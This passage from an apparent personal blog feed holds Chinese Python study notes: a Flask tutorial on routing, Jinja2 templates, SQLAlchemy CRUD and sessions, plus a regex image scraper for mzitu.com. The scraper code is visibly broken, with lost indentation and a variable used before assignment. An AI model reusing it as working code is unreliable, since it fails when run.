若果当前文件是作为入口程序运行，那么就执行app.run()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># app,run()</span></span><br><span class="line"><span class="comment"># 启动一个应用服务器，来接受用户的请求</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># listen()</span></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>debug模式,在pycharm里启动配置中要勾选FLASK_DEBUG<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><h3 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h3><p>新建config.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG = True</span><br></pre></td></tr></table></figure></p><p>主程序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello world"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><h3 id="url传参数"><a href="#url传参数" class="headerlink" title="url传参数"></a>url传参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/a/&lt;id&gt;') #参数放在&lt;&gt;中</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u"您请求的参数是：%s"</span> % id</span><br></pre></td></tr></table></figure><h3 id="url反转"><a href="#url反转" class="headerlink" title="url反转"></a>url反转</h3><p>url_for函数，视图函数的名称作为参数，返回视图函数的url。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> url_for(<span class="string">'a'</span>,id=<span class="number">1</span>)</span><br><span class="line"><span class="meta">@app.route('/list/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u"您请求的参数是：%s"</span> % id</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><h3 id="页面跳转和重定向"><a href="#页面跳转和重定向" class="headerlink" title="页面跳转和重定向"></a>页面跳转和重定向</h3><p>redirect()</p><h2 id="Jinja2模板"><a href="#Jinja2模板" class="headerlink" title="Jinja2模板"></a>Jinja2模板</h2><h3 id="模板渲染和参数"><a href="#模板渲染和参数" class="headerlink" title="模板渲染和参数"></a>模板渲染和参数</h3><ol><li>模板放在<code>templates</code>文件夹下</li><li>从flask中导入render_template</li><li>模板传参:创建一个字典，在render_template函数中使用**传入 </li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html里用&#123;&#123;&#125;&#125;包含变量</span><br></pre></td></tr></table></figure></li><li><p>参数也可以是对象和字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">        name = <span class="string">"廉天龙"</span></span><br><span class="line">        age = <span class="number">19</span></span><br><span class="line">    p = Person()</span><br><span class="line">    context =&#123;<span class="string">'username'</span>:<span class="string">'chenxiyuan'</span>,<span class="string">'gender'</span>:<span class="string">'男'</span>,<span class="string">'age'</span>:<span class="string">'19'</span>,<span class="string">'person'</span>:p&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名:&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>性别:&#123;&#123; gender &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄:&#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>名字:&#123;&#123; person['name'] &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄:&#123;&#123; person.age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用 &#123;% if 条件 %&#125;</span><br><span class="line">...</span><br><span class="line"> &#123;% else %&#125;</span><br><span class="line">...</span><br><span class="line"> &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for 条件 %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>|符号后接过滤器，本质是函数。</p><ol><li><p>default过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;arg|default(&apos;...&apos;)&#125;&#125;#变量不存在取默认</span><br></pre></td></tr></table></figure></li><li><p>length过滤器<br>返回长度</p><h3 id="继承和block"><a href="#继承和block" class="headerlink" title="继承和block"></a>继承和block</h3><p>父模板要写<code></code>，子模板要写自己的内容一定要放在block里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &apos;base.html&apos; %&#125;</span><br><span class="line">&#123;% block name %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h3><p>url_for(‘static’,filename=’路径’)</p><ol><li><p>加载css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;lin rel=&quot;stylesheet&quot; href=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;css/index.css&apos;)&#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>加载js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;js/index.js&apos;)&#125;&#125;&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="SQLAlchemy数据库"><a href="#SQLAlchemy数据库" class="headerlink" title="SQLAlchemy数据库"></a>SQLAlchemy数据库</h2><h3 id="ORM与flask-sqlalchemy"><a href="#ORM与flask-sqlalchemy" class="headerlink" title="ORM与flask_sqlalchemy"></a>ORM与flask_sqlalchemy</h3><ol><li>ORM: Object Relationship Mapping (模型关系映射)</li><li>flask_sqlalchemy是一套ORM框架</li><li>pip install flask_sqlalchemy<h3 id="SQLAlchemy使用"><a href="#SQLAlchemy使用" class="headerlink" title="SQLAlchemy使用"></a>SQLAlchemy使用</h3></li><li><p>设置配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#新建config.py</span><br><span class="line">#配置格式:dialect+driver://username:password@host:port/database</span><br><span class="line">DIALECT = &apos;mysql&apos;</span><br><span class="line">DRIVER = &apos;pymysql&apos;</span><br><span class="line">USERNAME = &apos;root&apos;</span><br><span class="line">PASSWORD =&apos;&apos;</span><br><span class="line">HOST = &apos;127.0.0.1&apos;</span><br><span class="line">PORT = &apos;3306&apos;</span><br><span class="line">DATABASE = &apos;test&apos;</span><br><span class="line">SQLALCHEMY_DATABASE_URI=&quot;&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8&quot;.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br></pre></td></tr></table></figure></li><li><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">db.create_all()</span><br><span class="line"><span class="comment"># 如果没有报错说明配置正确</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy模型与表映射"><a href="#SQLAlchemy模型与表映射" class="headerlink" title="SQLAlchemy模型与表映射"></a>SQLAlchemy模型与表映射</h3><ol><li>模型需要继承自db.Model,然后需要映射到表中的属性必须写成db.Column的数据类型</li><li>例子<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'article'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=<span class="keyword">True</span>,autoincrement=<span class="keyword">True</span>)</span><br><span class="line">    title =db.Column(db.String(<span class="number">100</span>),nullable=<span class="keyword">False</span>)</span><br><span class="line">    content =db.Column(db.Text,nullable=<span class="keyword">False</span>)</span><br><span class="line">db.create_all()</span><br><span class="line"><span class="comment">#这时候就可以在数据库中看到已经生成了一张表</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy增删改查"><a href="#SQLAlchemy增删改查" class="headerlink" title="SQLAlchemy增删改查"></a>SQLAlchemy增删改查</h3><ol><li><p>增</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 =Article(title=<span class="string">'aaa'</span>,content=<span class="string">'bbb'</span>)</span><br><span class="line">db.session.add(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'aaa'</span>).first()</span><br><span class="line">print(article1.title,article1.content)</span><br></pre></td></tr></table></figure></li><li><p>改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查询改后再提交</span></span><br><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'aaa'</span>).first()</span><br><span class="line">article1.title= <span class="string">'ccc'</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>删</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查再delete后提交</span></span><br><span class="line">article1 =Article.query.filter(Article.title==<span class="string">'ccc'</span>).first()</span><br><span class="line">db.session.delete(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure></li></ol><h3 id="SQLAlchemy外键约束"><a href="#SQLAlchemy外键约束" class="headerlink" title="SQLAlchemy外键约束"></a>SQLAlchemy外键约束</h3><ol><li>db.ForeignKey(‘table.column’)</li><li>db.relationship(‘table’,db.backref=(‘…’))</li><li>db.Table<h2 id="flask操作session"><a href="#flask操作session" class="headerlink" title="flask操作session"></a>flask操作session</h2></li><li>要从flask中导入session</li><li><p>要设置一个SECRET_KEY</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>]=os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'chenxiyuan'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.pop(<span class="string">'username'</span>)</span><br><span class="line">session.clear()</span><br></pre></td></tr></table></figure></li><li><p>获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.get(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure></li><li><p>过期时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.permanent =<span class="keyword">True</span></span><br><span class="line">app.config[<span class="string">'PERMANENT_SESSION_LIFETIME'</span>]= timedelta(days=<span class="number">7</span>)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;flask框架学习&quot;&gt;&lt;a href=&quot;#flask框架学习&quot; class=&quot;headerlink&quot; title=&quot;flask框架学习&quot;&gt;&lt;/a&gt;flask框架学习&lt;/h1&gt;&lt;h2 id=&quot;搭建虚拟环境&quot;&gt;&lt;a href=&quot;#搭建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;搭建虚拟环境&quot;&gt;&lt;/a&gt;搭建虚拟环境&lt;/h2&gt;&lt;p&gt;安装virtualenv&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install virtualenv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;开辟虚拟空间&lt;br&gt;&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;virtualenv flask-env&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;激活虚拟环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;linux/mac: source flask-env/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;windows: cd flask-env/Scripts 执行activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;退出虚拟环境: deactivate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>正则爬妹子图</title>
    <link href="http://chenxiyuan.vip/2019/07/09/%E6%AD%A3%E5%88%99%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE/"/>
    <id>http://chenxiyuan.vip/2019/07/09/正则爬妹子图/</id>
    <published>2019-07-09T04:12:24.000Z</published>
    <updated>2019-07-09T04:23:12.283Z</updated>
    
    <content type="html"><![CDATA[<p>直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dirs=<span class="string">"D:/妹子图"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">()</span>:</span>    <span class="comment">#创建文件夹</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirs):</span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">print(<span class="string">"D:/妹子图"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"妹子图文件夹已存在"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_page</span><span class="params">()</span>:</span><span class="comment">#获取到最大的页面数</span></span><br><span class="line">url=<span class="string">"https://www.mzitu.com/zipai/"</span></span><br><span class="line">r = requests.get(url,headers=headers)</span><br><span class="line">result=re.findall(<span class="string">"&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;"</span>,r.text,re.S)</span><br><span class="line"><span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_onepage_imgs</span><span class="params">(url)</span>:</span><span class="comment">#匹配到一个页面里所有的图片地址以及上传时间</span></span><br><span class="line">        r=requests.get(url,headers=headers)</span><br><span class="line">        result=re.findall(<span class="string">'&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;'</span>,r.text,re.S)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_onepage</span><span class="params">(onepage_list)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> onepage_list:</span><br><span class="line">                <span class="keyword">global</span> a</span><br><span class="line">                path0=j[<span class="number">0</span>].split()</span><br><span class="line">                path=path0[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]+path[<span class="number">0</span>][<span class="number">5</span>:<span class="number">7</span>]+path[<span class="number">0</span>][<span class="number">8</span>:<span class="number">10</span>]+path[<span class="number">1</span>]+path[<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>]+path[<span class="number">2</span>][<span class="number">3</span>:<span class="number">5</span>]<span class="comment">#把上传时间切片后作为文件名</span></span><br><span class="line">                img=requests.get(j[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(path+<span class="string">".jpg"</span>):<span class="comment">#因为上传时间可能相同，所以判断一下，如果相同就a+1</span></span><br><span class="line">                        a=a+<span class="number">1</span></span><br><span class="line">                        path=path+str(a)</span><br><span class="line">                        <span class="keyword">with</span> open(path+<span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                print(<span class="string">"下载第"</span>+str(i)+<span class="string">"页提交于"</span>+path0+<span class="string">"的图片"</span>)</span><br><span class="line">                                f.write(img.content)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        a=<span class="number">1</span></span><br><span class="line">                        <span class="keyword">with</span> open(path+<span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                print(<span class="string">"下载第"</span>+str(i)+<span class="string">"页提交于"</span>+path0+<span class="string">"的图片"</span>)</span><br><span class="line">                                f.write(img.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">        mkdir()</span><br><span class="line">        max_page=get_max_page()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(max_page),<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">                onepage_list=find_onepage_imgs(<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span> )</span><br><span class="line">                download_onepage(onepage_list)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>python访问mysql</title>
    <link href="http://chenxiyuan.vip/2019/07/08/python%E8%AE%BF%E9%97%AEmysql/"/>
    <id>http://chenxiyuan.vip/2019/07/08/python访问mysql/</id>
    <published>2019-07-08T01:40:11.000Z</published>
    <updated>2019-07-08T02:14:07.986Z</updated>
    
